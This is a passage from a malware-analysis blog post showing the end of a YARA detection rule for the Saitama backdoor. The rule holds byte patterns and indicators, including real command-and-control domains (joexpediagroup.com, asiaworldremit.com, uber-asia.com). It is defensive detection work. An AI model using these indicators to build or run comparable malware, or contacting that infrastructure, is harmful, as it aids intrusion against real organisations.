	<span class="err">$</span><span class="n">random</span> <span class="o">=</span> <span class="p">{</span><span class="mi">7</span><span class="n">E</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">06</span> <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">7</span><span class="n">E</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span>  <span class="mi">0</span><span class="n">C</span>  <span class="mi">02</span> <span class="mi">73</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">16</span> <span class="mi">13</span> <span class="err">??</span> <span class="mi">2</span><span class="n">B</span> <span class="err">??</span> <span class="mi">09</span>  <span class="mi">16</span>  <span class="mi">06</span>  <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span>  <span class="mi">13</span> <span class="err">??</span>  <span class="mi">08</span>  <span class="mi">06</span> <span class="mi">11</span> <span class="err">??</span> <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">13</span> <span class="err">??</span> <span class="mi">12</span> <span class="err">??</span> <span class="mi">28</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">28</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">C</span>  <span class="mi">06</span>  <span class="mi">11</span> <span class="err">??</span>  <span class="mi">17</span>  <span class="mi">6</span><span class="n">F</span> <span class="mi">46</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">A</span>  <span class="mi">11</span> <span class="err">??</span> <span class="mi">17</span> <span class="mi">58</span> <span class="mi">13</span> <span class="err">??</span> <span class="mi">11</span> <span class="err">??</span> <span class="mi">07</span> <span class="mi">32</span> <span class="err">??</span> <span class="mi">08</span> <span class="mi">2</span><span class="n">A</span> <span class="p">}</span>
	<span class="err">$</span><span class="n">MapBaseSubdomainCharacters</span> <span class="o">=</span> <span class="p">{</span><span class="mi">7</span><span class="n">E</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">16</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">2</span><span class="n">B</span> <span class="err">??</span>  <span class="mi">06</span> <span class="mi">03</span> <span class="mi">7</span><span class="n">E</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span>  <span class="mi">02</span>  <span class="mi">07</span> <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span>  <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span>   <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">12</span> <span class="err">??</span>  <span class="mi">28</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">28</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">07</span> <span class="mi">17</span> <span class="mi">58</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">07</span>    <span class="mi">02</span>  <span class="mi">6</span><span class="n">F</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span> <span class="err">??</span>   <span class="mi">32</span> <span class="err">??</span>   <span class="mi">06</span>  <span class="mi">2</span><span class="n">A</span><span class="p">}</span>

	<span class="err">$</span><span class="n">s1</span> <span class="o">=</span> <span class="s">"E:</span><span class="se">\\</span><span class="s">Saitama</span><span class="se">\\</span><span class="s">Saitama.Agent</span><span class="se">\\</span><span class="s">obj</span><span class="se">\\</span><span class="s">Release</span><span class="se">\\</span><span class="s">Saitama.Agent.pdb"</span> <span class="nb">ascii</span>
        <span class="err">$</span><span class="n">s2</span> <span class="o">=</span> <span class="s">"Saitama.Agent"</span> <span class="nb">ascii</span>
        
        <span class="err">$</span><span class="n">s3</span> <span class="o">=</span> <span class="s">"razupgnv2w01eos4t38h7yqidxmkljc6b9f5"</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s4</span> <span class="o">=</span> <span class="s">"joexpediagroup.com"</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s5</span> <span class="o">=</span> <span class="s">"asiaworldremit.com"</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s6</span> <span class="o">=</span> <span class="s">"uber-asia.com"</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s7</span> <span class="o">=</span> <span class="s">"Saitama.Agent.exe"</span> <span class="nb">ascii</span>
        
    
    <span class="n">condition</span><span class="p">:</span>
       <span class="n">uint16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5A4D</span>  <span class="ow">and</span> <span class="mi">3</span> <span class="n">of</span><span class="p">(</span><span class="err">$</span><span class="n">s</span><span class="o">*</span><span class="p">)</span>  <span class="ow">and</span> <span class="err">$</span><span class="n">GetRandomRange</span> <span class="ow">and</span> <span class="err">$</span><span class="n">random</span> <span class="ow">and</span> <span class="err">$</span><span class="n">MapBaseSubdomainCharacters</span>

<span class="p">}</span>
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#apt" class="page__taxonomy-item p-category" rel="tag">APT</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware Analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-06-24T00:00:00+00:00">June 24, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/malware%20analysis/2022/05/19/MarsStealer.html" class="pagination--pager" title="Deep Analysis of Mars Stealer
">Previous</a>
    
    
      <a href="/malware%20analysis/2022/06/24/Snakekeylogger.html" class="pagination--pager" title="Deep Analysis of Snake Keylogger
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 Mohamed Ashraf. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
